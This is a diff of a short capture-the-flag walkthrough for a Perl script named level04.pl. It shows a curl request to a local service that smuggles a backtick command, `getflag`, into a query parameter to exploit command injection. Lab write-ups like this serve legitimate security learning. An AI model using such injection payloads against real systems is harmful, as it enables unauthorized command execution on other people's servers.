@@ -6,7 +6,6 @@ Home directory : \[✓\] not empty.
 ```
 $ ls
 $ level04.pl
-
 ```
 ## Deeper check :
 
@@ -14,7 +13,7 @@ $ level04.pl
 
 In the perl file, we noticed that there is a possibility to inject a command in the param.
 
-`curl 'localhost:4747?x=`getflag`'`
+`curl 'localhost:4747?x=\`getflag\`'`
 
 
 
